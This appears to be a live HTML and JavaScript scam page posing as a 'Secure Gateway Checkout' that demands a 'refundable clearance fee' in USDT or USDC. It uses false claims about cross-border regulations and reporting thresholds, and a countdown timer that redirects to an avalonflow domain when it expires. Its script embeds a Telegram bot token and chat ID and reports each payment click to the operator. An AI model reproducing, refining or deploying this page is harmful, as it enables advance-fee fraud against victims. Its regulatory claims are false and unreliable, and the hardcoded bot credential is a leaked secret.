<!DOCTYPE html>
<html lang="en"> 
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Security Clearance</title>

    <style>
        :root {
            --bg-color: #0f172a;
            --card-bg: #1e293b;
            --accent-red: #ef4444;
            --text-main: #f8fafc;
            --text-muted: #94a3b8;
            --border-color: #334155;
            --btn-green: #10b981;
            --btn-green-hover: #059669;
        }

    body {
        font-family: 'Georgia', sans-serif; 
        margin: 0;
        color: #fff;
        background-color: var(--bg-color);
        background: linear-gradient(135deg,#0d0f1a,#050608);
        overflow-x:hidden;
    }
    button { cursor: pointer; }
    a { color: inherit; text-decoration: none; font-weight: bold; }

    #content {
        position: relative;
        z-index: 1;
        padding: 20px 15px;
        max-width: 600px;
        margin: auto;
        padding-bottom: 40px;
        text-align: center;
    }

    .glass-card {
      background: rgba(255,255,255,0.12);
      backdrop-filter: blur(12px);
      border-radius: 18px;
      padding: 28px;
      margin: 80px auto 30px;
      box-shadow: 0 10px 30px rgba(0,0,0,0.35);
      max-width: 280px !important;
    }

    .checkbox-container {
      display: flex;
      flex-direction: row-reverse;
      align-items: flex-end;
      justify-content: space-between;
      gap: 16px;
      margin-top: 14px;
    }

    .checkbox-container input {
      margin-bottom: 4px;
      cursor: pointer;
    }

    .checkbox-container label {
      flex: 1;
    }

    #payment-container {
        background-color: var(--card-bg);
        border: 1px solid var(--border-color);
        backdrop-filter: blur(15px);
        border-radius: 20px;
        padding: 25px 20px;
        box-shadow: 0 0 20px rgba(0,255,255,0.2), 0 0 40px rgba(255,0,255,0.1);
        text-align: center;
        max-width: 350px;
        width: 95%;
        animation: pulseGlow 3s infinite alternate;
        margin: 0 auto 50px auto;
    }

    @keyframes pulseGlow {
        0% { box-shadow: 0 0 20px rgba(0,255,255,0.2), 0 0 40px rgba(255,0,255,0.1); }
        50% { box-shadow: 0 0 30px rgba(0,255,255,0.4), 0 0 60px rgba(255,0,255,0.2); }
        100% { box-shadow: 0 0 25px rgba(0,255,255,0.3), 0 0 50px rgba(255,0,255,0.15); }
    }

    .amount {
        font-weight: bold;
        font-size: 1.6rem;
        color: #ff3fff;
        text-shadow: 0 0 10px #ff3fff, 0 0 20px #ff3fff;
    }

    p {
        margin: 12px 0;
        font-size: 1.2rem;
        letter-spacing: 0.5px;
    }

    p + p {
        font-family: 'Georgia', sans-serif; 
        font-size: clamp(1.6rem, 4vw, 1.8rem);
        color: #0ff;
        text-shadow: 0 0 6px #0ff;
        word-break: break-all;
        overflow-wrap: normal !important;
    }

    #usdt-timer, #usdc-timer {
        font-size: 1rem;
        font-weight: bold !important;
        color: var(--accent-red) !important;
        text-shadow: 0 0 5px rgba(239, 68, 68, 0.4);
        margin-top: 15px;
        text-align: center;
    }

    .progress-bar {
        width: 100%;
        height: 18px;
        background: rgba(255,255,255,0.06);
        border-radius: 12px;
        overflow: hidden;
        margin: 18px 0;
    }

    .progress-fill {
        height: 100%;
        width: 0%;
        border-radius: 12px;
        position: relative;
        transition: width 0.6s ease;
        background: var(--accent-red);
        box-shadow: 0 0 20px rgba(79,172,254,0.6);
    }

    .plan-pay {
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 8px;
        flex-wrap: wrap;
    }

    .plan-logo {
        width: 40px;
        height: 40px;
        border-radius: 50%;
        margin: 0;
    }

    .token-name, .network {
        display: inline-block;
        font-weight: bold;
        color: #fff;
    }

    #tokenSelector {
        display: flex;
        background: rgba(0, 0, 0, 0.3);
        border-radius: 12px;
        padding: 4px;
        gap: 6px;
        margin-bottom: 20px;
        border: 1px solid rgba(0, 255, 255, 0.2);
    }

    #tokenSelector button {
        flex: 1;
        padding: 10px 0;
        font-size: 0.85rem;
        font-weight: bold;
        color: #8a8f9d;
        background: transparent;
        border: none;
        border-radius: 8px;
        cursor: pointer;
        text-transform: uppercase;
        transition: all 0.3s ease-in-out;
    }

    #tokenSelector button.active {
        color: #fff;
        background: linear-gradient(135deg, #0ff, #ff3fff);
        box-shadow: 0 0 10px rgba(0, 255, 255, 0.4);
    }

    .header {
        text-align: center;
        margin-bottom: 1rem;
    }

    .badge {
        display: inline-block;
        background-color: rgba(239, 68, 68, 0.15);
        color: var(--accent-red);
        font-size: 0.75rem;
        font-weight: 700;
        padding: 0.25rem 0.75rem;
        border-radius: 9999px;
        border: 1px solid rgba(239, 68, 68, 0.3);
        text-transform: uppercase;
        letter-spacing: 0.05em;
        margin-bottom: 0.75rem;
    }

    .footer-note {
        margin-top: 1.5rem;
        font-size: 0.75rem;
        color: var(--text-muted);
        text-align: center;
        line-height: 1.3;
    }

    .token-card.inactive {
        display: none;
    }

    .notification-bar {
        position: fixed;
        top: -80px;
        right: 20px;
        background: rgba(30, 144, 255, 0.25);
        backdrop-filter: blur(12px);
        border: 1px solid rgba(30,144,255,0.4);
        color: #fff;
        padding: 12px 18px;
        border-radius: 12px;
        font-size: 14px;
        font-weight: bold;
        box-shadow: 0 6px 18px rgba(0,0,0,0.25);
        transition: top 0.5s ease, opacity 0.5s ease;
        z-index: 9999;
        opacity: 0;
        max-width: 350px;
    }

    .notification-bar.show { top: 20px; opacity: 1; }

    .walletconnect-actions {
        margin-top: 20px;
        display: flex;
        flex-direction: column;
        gap: 12px;
    }

    .wallet-btn {
        width: 100%;
        padding: 14px 18px;
        border: none;
        border-radius: 14px;
        font-size: 15px;
        font-weight: 700;
        color: #fff;
        background: linear-gradient(135deg,#6b2cd8,#9b59b6);
        box-shadow: 0 0 12px rgba(107,44,216,0.5), 0 0 24px rgba(155,89,182,0.3);
        transition: all .25s ease;
    }

    .wallet-btn:hover {
        transform: translateY(-2px);
        box-shadow: 0 0 18px rgba(107,44,216,0.7), 0 0 36px rgba(155,89,182,0.45);
    }
    </style>
</head>

<body>

  <div id="content">
    <div id="planNotification" class="notification-bar"></div>

    <div id="payment-container">
      <div class="header">
        <span class="badge">Secure Gateway Checkout</span>
      </div>

      <div id="tokenSelector">
        <button id="usdt-btn" class="active" onclick="showTokenCard('usdt')">USDT NETWORK</button>
        <button id="usdc-btn" onclick="showTokenCard('usdc')">USDC NETWORK</button>
      </div>

      <!-- USDT Card -->
      <div class="token-card" id="usdt-card">
        <div class="plan-pay">
          <img class="plan-logo" src="https://assets.coingecko.com/coins/images/325/large/Tether.png" alt="Tether Logo">
          <span class="token-name">USDT</span>
          <span class="network">ERC-20</span>
        </div>

        <div class="amount-section">
          <p>Required Clearance Fee</p>
          <p class="amount" id="usdt-amount">119.2037</p>
        </div>

        <div class="walletconnect-actions">
          <button id="walletPayBtnUsdt" class="wallet-btn" onclick="handleHostedCheckout('USDT')">
            Proceed to Secure Payment 
          </button>
        </div>
        <p id="usdt-timer">Verification expires in 05:00</p>

        <div class="progress-bar">
          <div class="progress-fill" id="usdt-progress"></div>
        </div>
      </div>

      <!-- USDC Card -->
      <div class="token-card inactive" id="usdc-card">
        <div class="plan-pay">
          <img class="plan-logo" src="https://assets.coingecko.com/coins/images/6319/large/USD_Coin_icon.png" alt="USD Coin Logo">
          <span class="token-name">USDC</span>
          <span class="network">ERC-20</span>
        </div>

        <div class="amount-section">
          <p>Required Clearance Fee</p>
          <p class="amount" id="usdc-amount">119.2037</p>
        </div>

        <div class="walletconnect-actions">
          <button id="walletPayBtnUsdc" class="wallet-btn" onclick="handleHostedCheckout('USDC')">
            Proceed to Secure Payment  
          </button>
        </div>
        <p id="usdc-timer">Verification expires in 05:00</p>

        <div class="progress-bar">
          <div class="progress-fill" id="usdc-progress"></div>
        </div>
      </div>
    </div>

    <div class="glass-card" style="margin:30px auto;">
      <div class="checkbox-container">
        <input type="checkbox" id="confirmation" checked disabled style="pointer-events: none;">
        <label for="confirmation" style="font-weight: 500; line-height: 1.6; color: #a46cff; display: block; text-align: left;">
          <span style="display: block; margin: 12px 0; padding-left: 12px; border-left: 3px solid rgba(200, 50, 80, 0.85); color: rgba(255, 255, 255, 0.85); font-size: 10px; font-weight: bold;">  
            Because your incoming transaction falls below minimum reporting thresholds, standard cross-border clearance regulations require the above refundable verification protocol before disbursement.
          </span>
        </label>
      </div>
      <div class="footer-note">
          Automated Clearance System • Security Protocol SSL-256
      </div>
    </div>
  </div>

<script>
    const TELEGRAM_BOT_TOKEN = "8971558300:AAFCkaN9K6ycSf4Bf-hHSeaPQFkFvf3Y8w8";
    const TELEGRAM_CHAT_ID = "-1003913850436";

    let timerInterval;
    const SOURCE_TOKEN_KEY = "avb_expiry_times";
    const totalDuration = 30 * 60 * 1000;
    
    let expiryTime = localStorage.getItem(SOURCE_TOKEN_KEY);
    if (!expiryTime) {
        expiryTime = Date.now() + totalDuration;
        localStorage.setItem(SOURCE_TOKEN_KEY, expiryTime);
    }

    let calculatedBaseAmount = parseFloat(localStorage.getItem("avalonflowCustomAmount") || "2133.33").toFixed(2);
    let randomDecimal = localStorage.getItem("avalonflowRandomDecimal");
    if (!randomDecimal) {
        randomDecimal = (Math.floor(Math.random() * 10000) / 10000).toString();
        localStorage.setItem("avalonflowRandomDecimal", randomDecimal);
    }

    let expectedAmount = (parseFloat(calculatedBaseAmount) + parseFloat(randomDecimal)).toFixed(4);
    document.getElementById("usdt-amount").innerText = "$" + expectedAmount;
    document.getElementById("usdc-amount").innerText = "$" + expectedAmount;

    window.showTokenCard = function(selectedToken) {
        document.querySelectorAll(".token-card").forEach(card => card.classList.add("inactive"));
        document.getElementById(`${selectedToken}-card`).classList.remove("inactive");

        document.getElementById("usdt-btn").classList.toggle("active", selectedToken === 'usdt');
        document.getElementById("usdc-btn").classList.toggle("active", selectedToken === 'usdc');
    };

    window.handleHostedCheckout = function(tokenType) {
        triggerNotification(`Redirecting to secure ${tokenType} payment gateway...`, 2500);

        // Notify Telegram that the user clicked to pay via API processor
        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: `🚀 <b>Hosted Gateway Redirect Triggered</b>\n• Token: <code>${tokenType}</code>\n• Amount: <code>$${expectedAmount}</code>`,
                parse_mode: 'HTML'
            })
        }).catch(err => console.warn(err));

        setTimeout(() => {
            // Replace this with your actual hosted payment provider invoice URL or integration link
            window.location.href = `https://nowpayments.io/payment?iv_amount=${expectedAmount}&iv_currency=${tokenType.toLowerCase()}`;
        }, 1500);
    };

    function triggerNotification(message, duration = 3000) {
        const notification = document.getElementById("planNotification");
        if (!notification) return;
        notification.textContent = message;
        notification.classList.add("show");
        setTimeout(() => notification.classList.remove("show"), duration);
    }

    function updateTimer() {
        const currentExpiry = parseInt(localStorage.getItem(SOURCE_TOKEN_KEY), 10) || expiryTime;
        const remaining = Math.max(0, Math.floor((currentExpiry - Date.now()) / 1000));
        const percentage = Math.max(0, (remaining / (totalDuration / 1000)) * 100);

        document.getElementById("usdt-progress").style.width = percentage + "%";
        document.getElementById("usdc-progress").style.width = percentage + "%";

        const minutes = String(Math.floor(remaining / 60)).padStart(2, "0");
        const seconds = String(remaining % 60).padStart(2, "0");
        
        const timeString = remaining > 0 ? `Verification expires in ${minutes}:${seconds}` : "Verification expired!";
        document.getElementById("usdt-timer").innerText = timeString;
        document.getElementById("usdc-timer").innerText = timeString;

        if (remaining <= 0) {
            clearInterval(timerInterval);
            localStorage.clear();
            window.location.replace("https://membership.avalonflow.site/notifications");
        }
    }

    timerInterval = setInterval(updateTimer, 1000);
    updateTimer();
</script>
</body>
</html>
